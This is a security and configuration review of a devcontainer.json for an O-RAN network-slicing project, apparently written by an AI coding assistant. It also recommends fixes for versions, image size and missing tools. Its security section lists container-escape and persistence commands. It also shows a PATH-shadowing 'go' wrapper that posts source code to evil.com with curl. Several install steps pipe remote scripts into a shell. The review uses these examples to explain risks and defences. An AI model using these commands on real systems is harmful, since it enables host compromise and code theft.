# Comprehensive DevContainer Configuration Analysis
## O-RAN Intent MANO for Network Slicing Project

**Analysis Date:** September 30, 2025
**Project:** O-RAN Intent-Based MANO for Network Slicing
**DevContainer File:** `.devcontainer/devcontainer.json`
**Analyzed By:** Claude Code DevContainer Expert

---

## Executive Summary

This analysis reveals **critical version mismatches**, **security concerns with privileged mode**, **bloated base image**, and **missing essential tools** in the current DevContainer configuration. The project uses multiple conflicting Go versions (1.22.10 vs 1.24.7) and an oversized universal image where a lightweight Go-focused image would be more appropriate.

**Risk Level:** 🔴 **HIGH** - Version inconsistencies could cause CI/CD failures and build issues

---

## 1. CURRENT CONFIGURATION ANALYSIS (Line-by-Line Review)

### Lines 1-3: Metadata
```json
{
  "name": "O-RAN Intent MANO Development",
  "image": "mcr.microsoft.com/devcontainers/universal:2-linux",
```

**Issues:**
- ❌ **BLOATED IMAGE**: Universal image is 8-12GB uncompressed, contains unnecessary tools for dozens of languages
- ❌ **INEFFICIENT**: Project primarily uses Go (1.24.7), with minimal Python 3.11 and Node 20 - doesn't need Ruby, PHP, Java, etc.
- ⚠️ **INITIALIZATION SLOW**: Large image significantly increases container startup time (2-5 minutes)

**Recommendation:** Replace with `mcr.microsoft.com/devcontainers/go:1.24` (2-3GB) + features for Python/Node

---

### Lines 4-23: Features Configuration

#### Lines 5-7: Python Feature
```json
"ghcr.io/devcontainers/features/python:1": {
  "version": "3.11"
}
```

**Status:** ✅ **CORRECT** - Matches CI requirements (test.yml uses Python 3.12 but 3.11 is acceptable)
**Issue:** ⚠️ CI uses Python 3.12 in some workflows - minor version mismatch

---

#### Lines 8-10: Go Feature
```json
"ghcr.io/devcontainers/features/go:1": {
  "version": "1.24.7"
}
```

**Status:** 🔴 **CRITICAL VERSION MISMATCH**

**Evidence of Conflicts:**
- **DevContainer**: Go 1.24.7 ✓
- **CI Pipeline (ci.yml)**: Go 1.24.7 ✓
- **Other Workflows**:
  - test.yml: Go 1.22.10 ❌
  - docker-build.yml: Go 1.22.10 ❌
  - dependency-review.yml: Go 1.22.10 ❌
  - codeql.yml: Go 1.22.10 ❌
- **Root go.mod**: Go 1.24.0 + toolchain 1.24.7 ✓
- **Makefile**: GO_VERSION := 1.24.7 ✓

**Impact:**
- Developers may test with Go 1.24.7 locally but CI fails with 1.22.10
- Go 1.24.7 features/syntax may not be available in 1.22.10
- Inconsistent dependency resolution between versions
- False sense of security - local tests pass, CI fails

**Action Required:** 🚨 **URGENT** - Standardize ALL workflows to Go 1.24.7

---

#### Lines 11-13: Node Feature
```json
"ghcr.io/devcontainers/features/node:1": {
  "version": "20"
}
```

**Status:** ✅ **CORRECT** - Matches CI (Node 20) and package.json requirement (>=18.0.0)
**Note:** Node is only used for claude-flow tooling (package.json), minimal usage

---

#### Lines 14: Docker-in-Docker
```json
"ghcr.io/devcontainers/features/docker-in-docker:2": {}
```

**Status:** ⚠️ **REQUIRES PRIVILEGED MODE** (addressed in lines 92-95)
**Security Concern:** Creates nested container complexity
**Purpose:** Required for Kind/K3s cluster testing and Docker builds

**Recommendation:** Consider using `docker-outside-of-docker` feature instead:
```json
"ghcr.io/devcontainers/features/docker-outside-of-docker:2": {}
```
This avoids privileged mode requirement and shares host Docker daemon.

---

#### Lines 15-19: Kubernetes Tools
```json
"ghcr.io/devcontainers/features/kubectl-helm-minikube:1": {
  "kubectl": "latest",
  "helm": "latest",
  "minikube": "none"
}
```

**Issues:**
1. ❌ **VERSION DRIFT**: "latest" causes non-reproducible environments
   - CI uses kubectl v1.31.0 (ci.yml line 26)
   - CI uses helm v3.16.2 (ci.yml line 27)
   - DevContainer gets whatever is "latest" today

2. ⚠️ **BREAKING CHANGES RISK**: Kubernetes has regular breaking changes between minor versions

**Recommended Fix:**
```json
"ghcr.io/devcontainers/features/kubectl-helm-minikube:1": {
  "kubectl": "1.31.0",
  "helm": "3.16.2",
  "minikube": "none"
}
```

---

#### Lines 20: Git Feature
```json
"ghcr.io/devcontainers/features/git:1": {}
```

**Status:** ✅ **ACCEPTABLE** - Git is typically pre-installed in most base images
**Note:** Redundant with universal image but harmless

---

#### Lines 21-22: Kind and K3s
```json
"ghcr.io/devcontainers-contrib/features/kind:1": {},
"ghcr.io/devcontainers-contrib/features/k3s-asdf:2": {}
```

**Status:** ⚠️ **VERSION MISMATCH**

**Evidence:**
- DevContainer: Uses "latest" from features
- CI (ci.yml): KIND_VERSION: 'v0.23.0'
- Makefile: KIND_VERSION := v0.20.0 ❌ **MISMATCH**
- Makefile: K3S_VERSION := v1.28.5+k3s1

**Issues:**
1. Developers may test with newer Kind version than CI
2. Makefile uses outdated v0.20.0, CI uses v0.23.0
3. K3s version not pinned in devcontainer

**Recommended Fix:**
```json
"ghcr.io/devcontainers-contrib/features/kind:1": {
  "version": "0.23.0"
},
"ghcr.io/devcontainers-contrib/features/k3s-asdf:2": {
  "version": "v1.28.5+k3s1"
}
```

---

### Lines 24-84: VS Code Customizations

#### Lines 26-42: Extensions
```json
"extensions": [
  "ms-python.python",                              // ✅ Essential
  "ms-python.vscode-pylance",                      // ✅ Essential
  "ms-python.black-formatter",                     // ✅ Essential
  "golang.go",                                     // ✅ Essential
  "redhat.vscode-yaml",                            // ✅ Essential for K8s
  "ms-kubernetes-tools.vscode-kubernetes-tools",   // ✅ Essential
  "ms-azuretools.vscode-docker",                   // ✅ Essential
  "hashicorp.terraform",                           // ❌ NOT USED - No .tf files
  "esbenp.prettier-vscode",                        // ⚠️ Minimal use
  "streetsidesoftware.code-spell-checker",         // ✅ Useful
  "GitHub.copilot",                                // ⚠️ User-specific, requires license
  "eamodio.gitlens",                               // ⚠️ User preference
  "mhutchie.git-graph",                            // ⚠️ User preference
  "timonwong.shellcheck",                          // ✅ Essential (many bash scripts)
  "foxundermoon.shell-format"                      // ✅ Useful
]
```

**Missing Critical Extensions:**
1. ❌ **Go Testing**: `golang.go-nightly` for latest Go 1.24.7 support
2. ❌ **YAML Validation**: `redhat.vscode-yaml` needs Kubernetes schema config
3. ❌ **Makefile Support**: `ms-vscode.makefile-tools` (project heavily uses Make)
4. ❌ **Protobuf Support**: If using gRPC/protobuf (common in O-RAN)
5. ❌ **Markdown Linting**: `davidanson.vscode-markdownlint` for docs

**Unnecessary Extensions:**
- `hashicorp.terraform` - No Terraform files in project
- `GitHub.copilot` - User-specific, should be user-installed
- `eamodio.gitlens`, `mhutchie.git-graph` - Nice-to-have but optional

---

#### Lines 43-83: VS Code Settings

**Line 44: Python Interpreter**
```json
"python.defaultInterpreter": "/usr/local/bin/python",
```
❌ **INCORRECT PATH** - Should be `/usr/local/python/current/bin/python` with Python feature

**Lines 45-49: Python Linting**
```json
"python.linting.enabled": true,
"python.linting.pylintEnabled": false,
"python.linting.flake8Enabled": false,
"python.formatting.provider": "black",
"python.formatting.blackPath": "/usr/local/bin/black",
```
⚠️ **DEPRECATED** - Python linting/formatting settings changed in Python extension v2023.x+

**Modern Equivalent:**
```json
"python.analysis.typeCheckingMode": "basic",
"[python]": {
  "editor.defaultFormatter": "ms-python.black-formatter",
  "editor.formatOnSave": true
}
```

**Line 50: Go Path**
```json
"go.gopath": "/go",
```
⚠️ **OUTDATED** - Go modules (used since Go 1.11) don't require GOPATH
**Better:** Remove this, Go 1.24.7 uses modules exclusively

**Lines 56-58: YAML Schemas**
```json
"yaml.schemas": {
  "kubernetes": "*.yaml"
}
```
❌ **INCORRECT SYNTAX** - Should be:
```json
"yaml.schemas": {
  "kubernetes": ["*.yaml", "*.yml"]
}
```

**Lines 60-82: Spell Checker Dictionary**
✅ **EXCELLENT** - Comprehensive project-specific terms added

---

### Lines 86-87: Lifecycle Commands

```json
"postCreateCommand": "bash scripts/bootstrap.sh",
"postStartCommand": "make setup",
```

**Analysis of bootstrap.sh:**
- ✅ Creates directory structure
- ✅ Validates environment variables
- ✅ Sets up Git hooks
- ✅ Installs Python/Go tools
- ❌ **ISSUE**: Fails if Docker daemon not ready (Kind/K3s checks)
- ⚠️ **SLOW**: Installs golangci-lint, delve, etc. on every create

**Analysis of Makefile setup target:**
- Calls `verify-env`, `install-tools`, then `bootstrap.sh`
- ⚠️ **REDUNDANCY**: Both commands install tools

**Recommended Fix:**
```json
"postCreateCommand": "bash scripts/bootstrap.sh",
"postStartCommand": "echo 'DevContainer ready!'",
```
Move tool installation to Dockerfile build stage or features configuration.

---

### Lines 88: Remote User
```json
"remoteUser": "vscode"
```
✅ **CORRECT** - Standard non-root user for security

---

### Lines 89-91: Mounts
```json
"mounts": [
  "source=${localWorkspaceFolder}/.env,target=/workspace/.env,type=bind,consistency=cached"
]
```

**Issues:**
1. ❌ **FAILS IF .ENV MISSING**: Container creation fails if `.env` doesn't exist
2. ⚠️ **SECURITY RISK**: `.env` may contain secrets being mounted directly
3. ⚠️ **CONSISTENCY=CACHED**: Deprecated in Docker, use `consistency=consistent` or remove

**Recommended Fix:**
```json
"mounts": [
  "source=${localWorkspaceFolder}/.env.sample,target=/workspace/.env.sample,type=bind,readonly"
]
```
Then in postCreateCommand: `[ -f .env ] || cp .env.sample .env`

---

### Lines 92-95: Container Runtime Arguments
```json
"runArgs": [
  "--init",
  "--privileged"
]
```

🔴 **CRITICAL SECURITY ISSUES:**

**--privileged Flag:**
- ❌ Grants full access to host devices
- ❌ Disables all security features (AppArmor, SELinux, seccomp)
- ❌ Container can modify host kernel, access all hardware
- ❌ Violation of least-privilege principle

**Why It's Used:**
- Required for docker-in-docker
- Required for Kind cluster creation (needs /dev/kvm or nested containers)

**Security Impact:**
- Compromised container = compromised host
- Any malicious code in dependencies can escape container
- Not suitable for multi-user environments

**Recommended Fix:**
Replace with specific capabilities:
```json
"runArgs": [
  "--init",
  "--cap-add=SYS_ADMIN",
  "--cap-add=NET_ADMIN",
  "--security-opt=apparmor=unconfined",
  "--device=/dev/fuse"
]
```

Or better: Use `docker-outside-of-docker` feature and remove privileged entirely.

---

### Lines 96-101: Container Environment Variables
```json
"containerEnv": {
  "SHELL": "/bin/bash",
  "PYTHONPATH": "/workspace",
  "GOPATH": "/go",
  "PATH": "/workspace/scripts:/usr/local/go/bin:/go/bin:${PATH}"
}
```

**Issues:**
1. ⚠️ **GOPATH outdated** - Not needed with Go modules
2. ❌ **PATH contains /workspace/scripts** - Security concern if malicious script added
3. ✅ PYTHONPATH correct for project structure

**Recommended:**
```json
"containerEnv": {
  "SHELL": "/bin/bash",
  "PYTHONPATH": "/workspace",
  "CGO_ENABLED": "1",
  "GOCACHE": "/go/cache",
  "PATH": "/usr/local/go/bin:/go/bin:${PATH}"
}
```

---

### Lines 102-103: Workspace Configuration
```json
"workspaceFolder": "/workspace",
"workspaceMount": "source=${localWorkspaceFolder},target=/workspace,type=bind,consistency=cached"
```

✅ **ACCEPTABLE** - Standard configuration
⚠️ `consistency=cached` is deprecated, use `delegated` or omit for default

---

## 2. COMPATIBILITY ISSUES

### Version Mismatches Summary

| Tool | DevContainer | CI (main) | CI (other) | Makefile | go.mod | Status |
|------|--------------|-----------|------------|----------|--------|--------|
| Go | 1.24.7 | 1.24.7 ✅ | 1.22.10 ❌ | 1.24.7 ✅ | 1.24.0/1.24.7 ✅ | 🔴 CRITICAL |
| Python | 3.11 | 3.12 ⚠️ | 3.12 | N/A | N/A | ⚠️ MINOR |
| Node | 20 | N/A | 20 ✅ | N/A | >=18 ✅ | ✅ OK |
| kubectl | latest ❌ | 1.31.0 | N/A | 1.28.5 ❌ | N/A | 🔴 MISMATCH |
| Helm | latest ❌ | 3.16.2 | N/A | N/A | N/A | ⚠️ DRIFT |
| Kind | latest ❌ | 0.23.0 | N/A | 0.20.0 ❌ | N/A | 🔴 MISMATCH |
| K3s | latest ❌ | N/A | N/A | v1.28.5+k3s1 | N/A | ⚠️ UNPINNED |

### Compatibility Matrix Analysis

**Go 1.24.7 vs 1.22.10 Differences:**
- Go 1.24.0 introduced new syntax and standard library changes
- Potential module compatibility issues with k8s.io/* packages
- Different compiler optimizations may affect race detector
- Go 1.24 requires different GOTOOLCHAIN handling

**Impact on Project:**
```go
// Example: Code using Go 1.24 features will fail in 1.22 CI
for i, v := range slices.Collect(iter.Seq[int]{...}) {
    // Works in Go 1.24.7 DevContainer
    // Fails in Go 1.22.10 CI workflows
}
```

---

## 3. SECURITY CONCERNS

### Critical Security Issues

#### 3.1 Privileged Mode (Risk Level: 🔴 CRITICAL)

**Current Configuration:**
```json
"runArgs": ["--init", "--privileged"]
```

**Security Implications:**
1. **Full Host Access**: Container can access ALL host devices (`/dev/*`)
2. **Kernel Modification**: Can load kernel modules, modify iptables
3. **Break Container Isolation**: Can access other containers' data
4. **Escape Prevention Disabled**: AppArmor, SELinux, seccomp all disabled
5. **Root Equivalence**: Container root = Host root in terms of capabilities

**Attack Scenarios:**
```bash
# Inside privileged container, attacker can:
mount /dev/sda1 /mnt          # Mount host filesystem
chroot /mnt                   # Escape to host
crontab -e                    # Add persistent backdoor
iptables -F                   # Disable host firewall
modprobe nf_conntrack_ftp     # Load kernel modules
```

**CVE Examples Exploiting Privileged Containers:**
- CVE-2019-5736 (runc escape)
- CVE-2020-15257 (containerd escape)
- CVE-2022-0847 (Dirty Pipe affects privileged containers severely)

**Mitigation Options:**

**Option A - Specific Capabilities (Recommended):**
```json
"runArgs": [
  "--init",
  "--cap-add=NET_ADMIN",      // For network configuration
  "--cap-add=SYS_ADMIN",      // For mounting (Kind needs this)
  "--security-opt=apparmor=unconfined",  // For Kind
  "--device=/dev/fuse",       // For overlayfs
  "--tmpfs=/tmp:exec"         // For build caches
]
```

**Option B - Docker-Outside-Docker (Best):**
```json
// Replace docker-in-docker feature with:
"features": {
  "ghcr.io/devcontainers/features/docker-outside-of-docker:2": {}
}
// Remove --privileged from runArgs
```

#### 3.2 .env File Mount Security

**Current Risk:**
```json
"mounts": [
  "source=${localWorkspaceFolder}/.env,target=/workspace/.env,type=bind"
]
```

**Issues:**
1. **.env may contain secrets**: API keys, tokens, credentials
2. **Bound to container**: Available to all processes in container
3. **Privilege escalation**: If privileged mode enabled, `.env` accessible to compromised processes
4. **Version control leakage**: Easy to accidentally commit `.env` with secrets

**Evidence from Project:**
```bash
# From scripts/bootstrap.sh lines 58-115:
# .env.sample contains:
GIT_TOKEN=""  # User token - should NEVER be in .env
KUBECONFIG_PATH=${HOME}/.kube/config  # Sensitive file path
```

**Recommended Approach:**
1. Use environment variables from host
2. Use Docker secrets or Kubernetes secrets for sensitive data
3. Mount `.env.sample` as read-only template

```json
"mounts": [
  "source=${localWorkspaceFolder}/.env.sample,target=/workspace/.env.sample,type=bind,readonly"
],
"containerEnv": {
  // Pass specific variables, not entire .env file
  "CLUSTER_NAME": "${localEnv:CLUSTER_NAME:oran-mano-local}"
}
```

#### 3.3 PATH Injection Risk

**Current Configuration:**
```json
"PATH": "/workspace/scripts:/usr/local/go/bin:/go/bin:${PATH}"
```

**Security Risk:**
- `/workspace/scripts` is FIRST in PATH
- Any file in this directory can shadow system commands
- Attacker can place malicious `ls`, `cd`, `make`, etc.

**Attack Example:**
```bash
# Attacker adds to /workspace/scripts/go:
#!/bin/bash
echo "Exfiltrating code..." >&2
curl -X POST https://evil.com/steal -d @./main.go
exec /usr/local/go/bin/go "$@"
```

**Fix:**
```json
"PATH": "/usr/local/go/bin:/go/bin:${PATH}:/workspace/scripts"
```
Move workspace scripts to END of PATH.

#### 3.4 Python Package Security

**From nlp/requirements.txt:**
```
cryptography==44.0.1  # Fixes CVE-2024-12797
urllib3==2.5.0        # Fixes CVE-2025-50182 and CVE-2025-50181
requests==2.32.5      # Fixes .netrc credentials leak
```

✅ **EXCELLENT** - Security-conscious with CVE tracking

**Recommendation:**
Add to devcontainer.json:
```json
"postCreateCommand": "bash scripts/bootstrap.sh && python -m pip check"
```
This verifies no conflicting package dependencies.

---

## 4. PERFORMANCE ISSUES

### 4.1 Base Image Size

**Current:** `mcr.microsoft.com/devcontainers/universal:2-linux`
- **Uncompressed Size**: ~8-12 GB
- **Compressed Download**: ~3-4 GB
- **Layer Count**: 50+ layers

**What's Included (Unnecessary for This Project):**
- Ruby, PHP, Java, Rust, Dart, Julia, Lua
- Conda/Anaconda
- Azure CLI, AWS CLI, Google Cloud SDK
- Multiple database clients (psql, mysql, mongo, redis-cli)
- Desktop environment tools

**Project Actually Uses:**
- Go 1.24.7 (primary language)
- Python 3.11 (minimal NLP module)
- Node 20 (only for claude-flow tooling)

**Performance Impact:**
1. **Initial Pull**: 5-10 minutes on typical connection
2. **Container Start**: 30-60 seconds vs 5-10 seconds for lean image
3. **Disk Space**: 12GB vs 3GB for optimized image
4. **Build Cache**: Invalidates entire 12GB on updates

### 4.2 Recommended Optimized Image

**Option A - Official Go Devcontainer (Recommended):**
```json
{
  "name": "O-RAN Intent MANO Development",
  "image": "mcr.microsoft.com/devcontainers/go:1.24",
  "features": {
    "ghcr.io/devcontainers/features/python:1": {"version": "3.11"},
    "ghcr.io/devcontainers/features/node:1": {"version": "20"},
    "ghcr.io/devcontainers/features/docker-outside-of-docker:2": {},
    "ghcr.io/devcontainers/features/kubectl-helm-minikube:1": {
      "kubectl": "1.31.0",
      "helm": "3.16.2",
      "minikube": "none"
    },
    "ghcr.io/devcontainers-contrib/features/kind:1": {"version": "0.23.0"},
    "ghcr.io/devcontainers-contrib/features/k3s-asdf:2": {"version": "v1.28.5+k3s1"}
  }
}
```

**Expected Image Size**: ~3.5 GB uncompressed

**Option B - Custom Dockerfile (Maximum Optimization):**
```dockerfile
FROM golang:1.24.7-bookworm

# Install only required tools
RUN apt-get update && apt-get install -y \
    python3.11 python3-pip \
    nodejs npm \
    kubectl helm \
    git make gcc \
    && rm -rf /var/lib/apt/lists/*

# Install Kind
RUN curl -Lo /usr/local/bin/kind https://kind.sigs.k8s.io/dl/v0.23.0/kind-linux-amd64 \
    && chmod +x /usr/local/bin/kind

# Pre-install Go tools
RUN go install github.com/golangci/golangci-lint/cmd/golangci-lint@latest \
    && go install golang.org/x/tools/cmd/goimports@latest
```

**Expected Image Size**: ~2.5 GB uncompressed

### 4.3 Initialization Performance

**Current Initialization Flow:**
1. Container starts (30-60s with universal image)
2. postCreateCommand runs bootstrap.sh:
   - Creates directories (1s)
   - Checks for secrets (5-10s with large codebase)
   - Sets up Git hooks (1s)
   - Installs Python packages (30-60s)
   - Installs Go tools (60-120s):
     - golangci-lint (~100MB download)
     - goimports, delve
3. postStartCommand runs `make setup`:
   - Runs bootstrap.sh AGAIN (redundant)
   - Verify-env
   - Install-tools

**Total Time**: 3-5 minutes

**Optimized Flow:**
1. Pre-install tools in Dockerfile/features
2. Remove redundant make setup
3. Only create directories/hooks on first run

**Expected Time**: 30-60 seconds

---

## 5. MISSING FEATURES & TOOLS

### 5.1 Critical Missing Tools

#### Kubebuilder (Required for Operator Development)
**Project Uses:** Kubernetes operators in `adapters/vnf-operator/`, `tn/manager/`
**CI Setup:** Lines 204-259 in ci.yml manually download Kubebuilder
**DevContainer:** ❌ NOT INSTALLED

**Impact:**
- Developers can't run operator tests locally
- Tests fail with "KUBEBUILDER_ASSETS not set"
- Wastes time discovering missing tool

**Fix:** Add to features:
```json
"ghcr.io/devcontainers-contrib/features/kubebuilder:1": {
  "version": "3.15.1"
}
```

Or install in postCreateCommand:
```bash
KUBEBUILDER_VERSION=3.15.1
curl -L -o kubebuilder "https://github.com/kubernetes-sigs/kubebuilder/releases/download/v${KUBEBUILDER_VERSION}/kubebuilder_linux_amd64"
sudo mv kubebuilder /usr/local/bin/ && sudo chmod +x /usr/local/bin/kubebuilder
```

#### Controller-Runtime Setup-Envtest
**Required for:** Controller runtime tests
**CI Setup:** Line 309-310 in ci.yml
**DevContainer:** ❌ NOT INSTALLED

**Fix:**
```bash
go install sigs.k8s.io/controller-runtime/tools/setup-envtest@latest
```

#### iperf3 (Network Performance Testing)
**Required for:** TN agent network tests
**CI Setup:** Lines 313-315, 538-541 in ci.yml
**DevContainer:** ❌ NOT INSTALLED

**Fix:** Add to Dockerfile or postCreateCommand:
```json
"postCreateCommand": "bash scripts/bootstrap.sh && sudo apt-get update && sudo apt-get install -y iperf3"
```

#### KPT (Nephio Package Management)
**Project Uses:** Nephio integration, package rendering
**Makefile:** Line 24 references KPT_VERSION
**DevContainer:** ❌ NOT INSTALLED

**Fix:**
```bash
KPT_VERSION=v1.0.0-beta.49
curl -L "https://github.com/GoogleContainerTools/kpt/releases/download/${KPT_VERSION}/kpt_linux_amd64" -o kpt
sudo mv kpt /usr/local/bin/ && sudo chmod +x /usr/local/bin/kpt
```

### 5.2 Missing VS Code Extensions

#### Essential Missing Extensions

**1. Makefile Tools**
```json
"ms-vscode.makefile-tools"
```
**Why:** Project heavily uses Makefile (396 lines, 40+ targets)

**2. Go Test Explorer**
```json
"premparihar.gotestexplorer"
```
**Why:** Better test discovery and debugging for Go tests

**3. Kubernetes YAML Schema Validation**
```json
"redhat.vscode-yaml" // Already installed but needs config fix
```
**Current Issue:** YAML schema syntax incorrect (line 56-58)

**4. Error Lens**
```json
"usernamehw.errorlens"
```
**Why:** Inline error display for Go/Python compilation errors

**5. Coverage Gutters**
```json
"ryanluker.vscode-coverage-gutters"
```
**Why:** Project tracks coverage.out files (line 361-362 in ci.yml)

**6. Remote Containers Helper**
```json
"ms-vscode-remote.remote-containers"
```
**Why:** Better DevContainer management and rebuild

### 5.3 Missing Linters and Security Tools

#### Tools Referenced in CI but Not in DevContainer

**1. golangci-lint**
- CI: Line 163-166 uses golangci/golangci-lint-action@v8
- DevContainer: Installed in bootstrap.sh but with `@latest` (non-reproducible)
- **Fix:** Pin version in Dockerfile

**2. gosec (Go Security Scanner)**
- CI: Lines 92-152 run extensive gosec scanning
- DevContainer: Not pre-installed
- **Fix:**
```bash
go install github.com/securego/gosec/v2/cmd/gosec@latest
```

**3. staticcheck**
- CI: Line 86-90 (commented out but referenced)
- DevContainer: Not installed
- **Fix:**
```bash
go install honnef.co/go/tools/cmd/staticcheck@latest
```

**4. yamllint**
- Makefile: Lines 46-49, 355-369 reference yamllint
- DevContainer: Not installed
- **Fix:**
```bash
pip install yamllint
```

**5. gitleaks (Secret Scanning)**
- package.json: Line 18 uses gitleaks
- Makefile: Line 357-361 uses gitleaks
- DevContainer: Not installed
- **Fix:**
```bash
curl -sSfL https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz | tar -xz -C /tmp/
sudo mv /tmp/gitleaks /usr/local/bin/
```

**6. trivy (Container Scanning)**
- CI: Lines 476-492 use Trivy
- package.json: Line 22 references trivy
- DevContainer: Not installed
- **Fix:**
```bash
curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh | sh -s -- -b /usr/local/bin
```

**7. act (Local CI Runner)**
- package.json: Line 7, 59 use act
- Makefile: Lines 321-333 use act
- DevContainer: Not installed
- **Fix:**
```bash
curl https://raw.githubusercontent.com/nektos/act/master/install.sh | sudo bash
```

---

## 6. BEST PRACTICES VIOLATIONS

### 6.1 Configuration Management

#### Violation 1: Hardcoded "latest" Versions
**Lines:** 16-18 (kubectl, helm), 21-22 (Kind, K3s)
**Impact:** Non-reproducible builds, potential breaking changes
**Fix:** Pin all versions explicitly

#### Violation 2: Inconsistent Version Management
**Locations:** DevContainer, CI workflows, Makefile, go.mod
**Impact:** "Works on my machine" syndrome
**Fix:** Single source of truth for versions (e.g., .tool-versions or versions.env)

**Recommended .tool-versions file:**
```
golang 1.24.7
python 3.11.0
nodejs 20.11.0
kubectl 1.31.0
helm 3.16.2
kind 0.23.0
```

Then reference in all configs:
```bash
GO_VERSION=$(grep golang .tool-versions | cut -d' ' -f2)
```

### 6.2 Security Best Practices

#### Violation 1: Privileged Mode Usage
**Line:** 94
**Impact:** Full host access, container escape potential
**Fix:** Use specific capabilities or docker-outside-of-docker

#### Violation 2: Secrets in .env File
**Lines:** 89-90 mount .env directly
**Impact:** Secret leakage risk
**Fix:** Use environment variable substitution

#### Violation 3: Workspace Scripts in PATH First
**Line:** 100 puts /workspace/scripts first in PATH
**Impact:** Command shadowing attack surface
**Fix:** Move to end of PATH

### 6.3 Performance Best Practices

#### Violation 1: Universal Image for Specialized Project
**Line:** 3
**Impact:** 5-10 minute container initialization
**Fix:** Use language-specific base image

#### Violation 2: Redundant Tool Installation
**Lines:** 86-87 both run tool installation
**Impact:** Doubled initialization time
**Fix:** Install tools once in Dockerfile or features

#### Violation 3: No Layer Caching for Dependencies
**Impact:** Reinstalls Python packages every rebuild
**Fix:** Pre-install in custom Dockerfile layer:
```dockerfile
COPY nlp/requirements.txt /tmp/
RUN pip install -r /tmp/requirements.txt
```

### 6.4 Maintainability Best Practices

#### Violation 1: Outdated Python Extension Settings
**Lines:** 44-49 use deprecated settings
**Impact:** Extension warnings, potential future breakage
**Fix:** Update to modern Python extension API

#### Violation 2: Commented-Out Features
**Example:** No pre-build or post-attach commands defined
**Impact:** Incomplete lifecycle management
**Fix:** Define complete lifecycle:
```json
"onCreateCommand": "setup-tools.sh",
"postCreateCommand": "init-workspace.sh",
"postStartCommand": "verify-ready.sh",
"postAttachCommand": "echo 'Ready to code!'"
```

#### Violation 3: No Health Checks
**Impact:** Container may appear ready but tools not functional
**Fix:** Add verification script:
```bash
#!/bin/bash
echo "Verifying development environment..."
go version || exit 1
python3 --version || exit 1
kubectl version --client || exit 1
kind version || exit 1
echo "✓ All tools ready"
```

---

## 7. SPECIFIC OPTIMIZATION RECOMMENDATIONS

### Recommendation 1: Standardize Go Version Across All Configs

**Priority:** 🔴 CRITICAL
**Effort:** LOW (30 minutes)
**Impact:** HIGH (prevents CI/local discrepancies)

**Files to Update:**
1. `.github/workflows/test.yml` line 8:
```yaml
GO_VERSION: '1.24.7'  # Changed from 1.22.10
```

2. `.github/workflows/docker-build.yml` line 19:
```yaml
GO_VERSION: '1.24.7'  # Changed from 1.22.10
```

3. `.github/workflows/docker-build.yml` line 54:
```dockerfile
FROM golang:1.24.7-alpine AS builder  # Changed from 1.22.10
```

4. `.github/workflows/dependency-review.yml` line 35:
```yaml
go-version: '1.24.7'  # Changed from 1.22.10
```

5. `.github/workflows/codeql.yml` line 5:
```yaml
GO_VERSION: '1.24.7'  # Changed from 1.22.10
```

### Recommendation 2: Replace Universal Image with Go Base Image

**Priority:** ⚠️ HIGH
**Effort:** MEDIUM (2-3 hours including testing)
**Impact:** HIGH (75% reduction in image size, 80% faster startup)

**New devcontainer.json:**
```json
{
  "name": "O-RAN Intent MANO Development",
  "image": "mcr.microsoft.com/devcontainers/go:1.24",

  "features": {
    "ghcr.io/devcontainers/features/python:1": {
      "version": "3.11",
      "installTools": true
    },
    "ghcr.io/devcontainers/features/node:1": {
      "version": "20",
      "nodeGypDependencies": false
    },
    "ghcr.io/devcontainers/features/docker-outside-of-docker:2": {
      "version": "latest",
      "enableNonRootDocker": "true"
    },
    "ghcr.io/devcontainers/features/kubectl-helm-minikube:1": {
      "version": "latest",
      "kubectl": "1.31.0",
      "helm": "3.16.2",
      "minikube": "none"
    },
    "ghcr.io/devcontainers/features/git:1": {
      "version": "latest"
    },
    "ghcr.io/devcontainers-contrib/features/kind:1": {
      "version": "0.23.0"
    },
    "ghcr.io/devcontainers-contrib/features/k3s-asdf:2": {
      "version": "v1.28.5+k3s1"
    },
    "ghcr.io/devcontainers-contrib/features/kubebuilder:1": {
      "version": "3.15.1"
    }
  },

  "customizations": {
    "vscode": {
      "extensions": [
        "golang.go",
        "ms-python.python",
        "ms-python.vscode-pylance",
        "ms-python.black-formatter",
        "redhat.vscode-yaml",
        "ms-kubernetes-tools.vscode-kubernetes-tools",
        "ms-azuretools.vscode-docker",
        "esbenp.prettier-vscode",
        "streetsidesoftware.code-spell-checker",
        "timonwong.shellcheck",
        "foxundermoon.shell-format",
        "ms-vscode.makefile-tools",
        "premparihar.gotestexplorer",
        "usernamehw.errorlens",
        "ryanluker.vscode-coverage-gutters"
      ],
      "settings": {
        "go.toolsManagement.autoUpdate": true,
        "go.useLanguageServer": true,
        "go.lintTool": "golangci-lint",
        "go.lintOnSave": "package",
        "go.testFlags": ["-v", "-race"],
        "go.coverOnSave": false,
        "go.coverageDecorator": {
          "type": "gutter"
        },

        "[python]": {
          "editor.defaultFormatter": "ms-python.black-formatter",
          "editor.formatOnSave": true,
          "editor.codeActionsOnSave": {
            "source.organizeImports": "explicit"
          }
        },
        "python.testing.pytestEnabled": true,
        "python.analysis.typeCheckingMode": "basic",

        "editor.formatOnSave": true,
        "editor.rulers": [80, 120],
        "files.trimTrailingWhitespace": true,
        "files.insertFinalNewline": true,

        "yaml.schemas": {
          "kubernetes": ["*.yaml", "*.yml"]
        },
        "yaml.format.enable": true,
        "yaml.validate": true,

        "cSpell.enabled": true,
        "cSpell.words": [
          "MANO", "ORAN", "Nephio", "Porch", "ConfigSync", "Kube",
          "VXLAN", "GitOps", "CRDs", "kubectl", "kustomize",
          "devcontainer", "ruff", "golangci", "shellcheck",
          "hadolint", "yamllint", "markdownlint", "aspell",
          "O2ims", "O2dms", "kubebuilder", "envtest"
        ],

        "makefile.configureOnOpen": true
      }
    }
  },

  "postCreateCommand": "bash .devcontainer/setup.sh",

  "remoteUser": "vscode",

  "mounts": [],

  "runArgs": [
    "--init"
  ],

  "containerEnv": {
    "SHELL": "/bin/bash",
    "PYTHONPATH": "/workspace",
    "CGO_ENABLED": "1",
    "PATH": "/usr/local/go/bin:/go/bin:${PATH}:/workspace/scripts"
  },

  "workspaceFolder": "/workspace"
}
```

**New .devcontainer/setup.sh:**
```bash
#!/bin/bash
set -euo pipefail

echo "Setting up O-RAN Intent MANO development environment..."

# Install additional Go tools
echo "Installing Go development tools..."
go install github.com/golangci/golangci-lint/cmd/golangci-lint@v1.54.0
go install golang.org/x/tools/cmd/goimports@latest
